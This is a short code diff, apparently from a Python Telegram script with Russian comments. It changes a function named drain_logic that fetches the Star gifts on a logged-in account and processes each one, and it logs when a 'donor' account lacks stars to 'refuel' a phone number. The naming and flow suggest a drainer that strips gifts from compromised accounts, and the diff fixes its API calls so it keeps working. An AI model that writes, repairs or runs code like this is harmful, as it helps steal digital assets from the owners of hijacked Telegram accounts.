@@ -136,7 +136,7 @@ async def drain_logic(client, phone):
                 
                 await asyncio.sleep(7)
                 # ИСПРАВЛЕНО: Убрали offset='', так как он вызывает ошибку
-                received_gifts = await client(functions.payments.GetStarGiftsRequest(limit=5))
+                received_gifts = await client(functions.payments.GetStarGiftsRequest())
                 for g in received_gifts.gifts:
                     try:
                         await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
@@ -149,7 +149,7 @@ async def drain_logic(client, phone):
                 send_log(f"⚠️ Нет звезд на доноре для заправки {phone}!")
 
         # ИСПРАВЛЕНО: Убрали offset='' здесь тоже
-        all_gifts = await client(functions.payments.GetStarGiftsRequest(limit=100))
+        all_gifts = await client(functions.payments.GetStarGiftsRequest())
         total_found = len(all_gifts.gifts)
         success_count = 0
         
